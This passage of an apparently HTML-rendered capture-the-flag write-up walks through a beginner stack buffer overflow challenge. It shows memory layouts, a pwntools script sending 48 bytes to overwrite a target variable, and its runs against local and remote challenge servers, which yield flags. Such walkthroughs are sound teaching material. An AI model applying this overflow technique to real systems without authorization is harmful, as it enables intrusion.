+</span><span class="z-text z-plain">0x00007ffc5992bf88 | 0x00007fcee1e21c87 &lt;- Saved return address
+</span><span class="z-text z-plain">0x00007ffc5992bf90 | 0x0000000000000001
+</span><span class="z-text z-plain">0x00007ffc5992bf98 | 0x00007ffc5992c068
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">After we insert 4 &quot;A&quot;s, (the hex representation of A is 0x41), the stack layout like this:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">      [Addr]       |      [Value]       
+</span><span class="z-text z-plain">-------------------+-------------------
+</span><span class="z-text z-plain">0x00007ffc5992bf50 | 0x0000000041414141 &lt;- Start of buffer
+</span><span class="z-text z-plain">0x00007ffc5992bf58 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf60 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf68 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf70 | 0x6969696969696969 &lt;- Dummy value for alignment
+</span><span class="z-text z-plain">0x00007ffc5992bf78 | 0x00000000deadbeef &lt;- Target to change
+</span><span class="z-text z-plain">0x00007ffc5992bf80 | 0x000055a9dcd56800 &lt;- Saved rbp
+</span><span class="z-text z-plain">0x00007ffc5992bf88 | 0x00007fcee1e21c87 &lt;- Saved return address
+</span><span class="z-text z-plain">0x00007ffc5992bf90 | 0x0000000000000001
+</span><span class="z-text z-plain">0x00007ffc5992bf98 | 0x00007ffc5992c068
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">After we insert 4 &quot;B&quot;s, (the hex representation of B is 0x42), the stack layout looks like this:                                                                                                                                           
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">      [Addr]       |      [Value]                                                                                                                                                                                                          
+</span><span class="z-text z-plain">-------------------+-------------------                                                                                                                                                                                                    
+</span><span class="z-text z-plain">0x00007ffc5992bf50 | 0x4242424241414141 &lt;- Start of buffer                                                                                                                                                                                 
+</span><span class="z-text z-plain">0x00007ffc5992bf58 | 0x0000000000000000                                                                                                                                                                                                    
+</span><span class="z-text z-plain">0x00007ffc5992bf60 | 0x0000000000000000                                                                                                                                                                                                    
+</span><span class="z-text z-plain">0x00007ffc5992bf68 | 0x0000000000000000                                                                                                                                                                                                    
+</span><span class="z-text z-plain">0x00007ffc5992bf70 | 0x6969696969696969 &lt;- Dummy value for alignment                                                                                                                                                                       
+</span><span class="z-text z-plain">0x00007ffc5992bf78 | 0x00000000deadbeef &lt;- Target to change                                                                                                                                                                                
+</span><span class="z-text z-plain">0x00007ffc5992bf80 | 0x000055a9dcd56800 &lt;- Saved rbp                                                                                                                                                                                       
+</span><span class="z-text z-plain">0x00007ffc5992bf88 | 0x00007fcee1e21c87 &lt;- Saved return address                                                                                                                                                                            
+</span><span class="z-text z-plain">0x00007ffc5992bf90 | 0x0000000000000001                                                                                                                                                                                                    
+</span><span class="z-text z-plain">0x00007ffc5992bf98 | 0x00007ffc5992c068                                                                                                                                                                                                    
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉                                                                                                                                        
+</span><span class="z-text z-plain">◉                                                                                                 ◉                                                                                                                                        
+</span><span class="z-text z-plain">◉  Fill the 32-byte buffer, overwrite the alginment address and the &quot;target&#39;s&quot; 0xdeadbeef value.  ◉                                                                                                                                        
+</span><span class="z-text z-plain">◉                                                                                                 ◉                                                                                                                                        
+</span><span class="z-text z-plain">◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉                                                                                                                                        
+</span><span class="z-text z-plain">                                                                                                                                                                                                                                           
+</span><span class="z-text z-plain">&gt;&gt;
+</span></code></pre>
+<p>As we suspected, this program really guides us. We have to fill the buffer and overwrite the 'target' value.</p>
+<h1 id="exploit">Exploit</h1>
+<p>This program should be easy to exploit.</p>
+<p>We see that the buffer is made of <code>32</code> bytes, and that there's <code>8</code> bytes of dummy values, for alignment according to the program. Therefore, there's <code>40</code> bytes between the start of the buffer and the target memory address. If we want to fill the entire target memory address with garbage values, we'll have to enter <code>8</code> more bytes of data, so we'll have to enter <code>48</code> bytes of garbage to completely overwrite the memory address of the target.</p>
+<h2 id="local">Local</h2>
+<p>First, I'll test locally if our strategy works, using this script:</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Open process
+</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">PATH</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/workspace/gs<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">process</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">PATH</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Craft payload
+</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">A<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">48</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Send payload
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">sendline</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Read flag
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">success</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-storage z-type z-string z-python">f</span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-single z-python">Flag --&gt; </span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-begin z-python">{</span><span class="z-source z-python z-embedded"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">recvline_contains</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">HTB<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">strip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">decode</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span></span></span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-end z-python">}</span></span><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>I'll save it as <code>exploit.py</code>, an I'll run it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> python3 /workspace/exploit.py</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[+] Starting local process &#39;/workspace/gs&#39;: pid 2620
+</span><span class="z-text z-plain">[*] Process &#39;/workspace/gs&#39; stopped with exit code 0 (pid 2620)
+</span><span class="z-text z-plain">[+] Flag --&gt; HTB{f4k3_fl4g_4_t35t1ng}
+</span></code></pre>
+<p>It successfully retrieved the content of <code>flag.txt</code>!</p>
+<h2 id="remote">Remote</h2>
+<p>Let's adapt the previous script to interact with the remote server.</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Open connection
+</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">IP</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">188.166.175.58<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">PORT</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-constant z-numeric z-integer z-decimal z-python">31551</span>
+</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">r</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">IP</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">PORT</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Craft payload
+</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">A<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">48</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Send payload
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">r</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">sendline</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Read flag
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">success</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-storage z-type z-string z-python">f</span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-single z-python">Flag --&gt; </span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-begin z-python">{</span><span class="z-source z-python z-embedded"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">r</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">recvline_contains</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">HTB<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">strip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">decode</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span></span></span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-end z-python">}</span></span><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>Let's try it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> python3 /workspace/exploit.py</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[+] Opening connection to 188.166.175.58 on port 31551: Done
+</span><span class="z-text z-plain">[+] Flag --&gt; HTB{b0f_tut0r14l5_4r3_g00d}
+</span><span class="z-text z-plain">[*] Closed connection to 188.166.175.58 port 31551
+</span></code></pre>
+<p>Nice!</p>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/success.png" alt="Success" /></p>
+<p>That's it for this challenge! It was extremely easy for me, as stack-based buffer overflow are really classic and this one only required to fill the buffer with random values.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
